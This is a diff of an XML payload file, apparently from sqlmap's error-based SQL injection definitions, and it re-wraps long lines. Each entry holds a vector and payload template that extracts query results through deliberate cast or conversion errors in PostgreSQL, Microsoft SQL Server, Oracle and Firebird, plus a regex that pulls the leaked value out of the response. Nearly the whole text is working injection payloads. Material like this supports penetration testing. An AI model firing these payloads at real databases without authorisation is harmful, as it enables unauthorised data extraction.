         <where>1</where>
         <vector>,(CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC))</vector>
         <request>
-            <payload>,(CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC))</payload>
+            <payload>,(CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0
+                END))::text||'[DELIMITER_STOP]' AS NUMERIC))
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -1158,7 +1328,9 @@
         <where>1</where>
         <vector>,(CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC))</vector>
         <request>
-            <payload>,(CAST('[DELIMITER_START]'||(SELECT 1 FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)::text||'[DELIMITER_STOP]' AS NUMERIC))</payload>
+            <payload>,(CAST('[DELIMITER_START]'||(SELECT 1 FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN
+                ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)::text||'[DELIMITER_STOP]' AS NUMERIC))
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -1175,9 +1347,13 @@
         <risk>1</risk>
         <clause>3</clause>
         <where>1</where>
-        <vector>,(SELECT [RANDNUM] WHERE [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')))</vector>
+        <vector>,(SELECT [RANDNUM] WHERE [RANDNUM]=CONVERT(INT,(SELECT
+            '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')))
+        </vector>
         <request>
-            <payload>,(SELECT [RANDNUM] WHERE [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))</payload>
+            <payload>,(SELECT [RANDNUM] WHERE [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN
+                ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -1196,9 +1372,13 @@
         <risk>1</risk>
         <clause>2,3</clause>
         <where>1</where>
-        <vector>,(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
+        <vector>,(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(([QUERY]),'
+            ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)
+        </vector>
         <request>
-            <payload>,(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
+            <payload>,(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN
+                ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -1217,7 +1397,9 @@
         <where>1</where>
         <vector>,(SELECT [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]'))</vector>
         <request>
-            <payload>,(SELECT [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]'))</payload>
+            <payload>,(SELECT [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END
+                FROM RDB$DATABASE)||'[DELIMITER_STOP]'))
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
